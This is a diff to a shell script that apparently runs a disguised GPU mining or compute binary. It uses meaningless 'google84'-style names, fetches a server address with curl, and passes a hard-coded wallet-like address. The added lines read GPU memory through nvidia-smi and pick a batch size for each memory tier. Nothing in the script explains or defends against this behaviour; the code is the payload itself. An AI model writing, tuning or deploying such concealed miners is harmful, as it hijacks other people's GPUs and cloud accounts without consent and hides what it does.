@@ -86,11 +86,42 @@ google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
 if [[ $google8412 = "" ]]
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 12
+google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/\[MiB\]//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g')
+
+if (($google84 >= 9188 && $google84 <= 16884));
+then
+
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 29
 if [ $? -eq 124 ]; then
 echo "google84"
 else
 echo "google8474"
+fi
+
+fi
+
+if (($google84 >= 5288 && $google84 <= 9184));
+then
+
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 14
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+fi
+
+if (($google84 >= 2874 && $google84 <= 5184));
+then
+
+timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 7
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
 fi
 
 else
